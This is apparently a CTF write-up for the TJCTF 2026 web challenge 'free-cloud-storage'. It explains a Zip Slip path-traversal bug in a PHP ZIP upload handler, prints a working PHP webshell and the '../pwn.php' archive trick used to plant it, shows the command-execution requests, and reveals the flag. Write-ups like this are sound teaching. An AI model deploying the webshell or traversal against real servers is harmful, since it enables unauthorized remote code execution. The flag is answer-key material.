---
title: "TJCTF2026-web/free-cloud-storage"
description: "CTF writeup - web/free-cloud-storage (TJCTF 2026)"
date: 2026-05-17
tags: [CTF, Web, TJCTF]
category: "TJCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

### File analysis

In `upload.php`, the ZIP upload handling has logic like:

```php
$uploadDir = __DIR__ . '/uploads/';

$zipper->make($destination)->extractTo($uploadDir);
```

The server's idea is:

1. The user uploads a ZIP file.
2. The server saves the ZIP file.
3. The server extracts the ZIP contents into the `uploads/` directory.

If the ZIP file contains an entry named:

```text
../pwn.php
```

then when extracted into:

```text
/var/www/html/uploads/
```

the actual path becomes:

```text
/var/www/html/uploads/../pwn.php
```

After normalizing the path, it is equivalent to:

```text
/var/www/html/pwn.php
```

That is, the attacker can write a file outside the `uploads/` directory - specifically, write a PHP webshell into the web root.

This is a **Zip Slip / Path Traversal during archive extraction** bug.

### Creating the ZIP payload

We don't upload PHP directly. Instead, we create a ZIP file containing a PHP shell.

Create a `pwn.php` file and zip it:

```php
<?php
echo "<pre>";
$cmd = $_GET["cmd"] ?? "id";
system($cmd);
echo "</pre>";
?>
```

Upload that zip file:

![](./image.png)

Upload and access the webshell that was just written out:

```text
/pwn.php?cmd=id
```

Result:

![](./image-1.png)

So we have executed a system command on the server with the `www-data` user privileges.

At this point, the vulnerability has been successfully exploited into **Remote Code Execution**.

### Finding the flag location

Use the `find` command to look for files whose name contains `flag`:

```text
cmd = find / -name "*flag*" 2>/dev/null
```

Result

![](./image-2.png)

Read the file `/var/www/html/flag.txt`:

![](./image-3.png)

### Flag

```text
tjctf{i_l0v3_fr33_st0r4g3}
```
